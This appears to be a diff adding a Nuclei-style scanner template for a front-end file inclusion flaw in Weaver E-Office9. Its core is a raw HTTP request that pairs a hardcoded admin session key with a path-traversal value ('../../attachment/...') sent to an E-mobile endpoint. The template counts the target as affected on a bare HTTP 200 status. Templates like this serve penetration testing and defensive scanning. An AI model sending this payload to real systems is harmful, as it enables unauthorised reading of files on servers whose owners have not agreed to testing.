@@ -1,0 +1,24 @@
+id: fanweiOA-Weaver-E-Office9-qiantai-file-baohan
+
+info:
+  name: 泛微 Weaver E-Office9 前台文件包含漏洞
+  author: cnaq  
+  severity: high
+  description: 泛微 Weaver E-Office9 前台文件包含
+  reference: 
+    - https://docs.qq.com/doc/DWHNoWHFKeVpFWUZG?dver=&_t=1711936000958&u=ef97bcbd4a194029a7cea662016dd789
+  tags: fanwei,oa,eweaver,lfi
+
+
+requests:
+  - raw:
+      - |
+        GET /E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
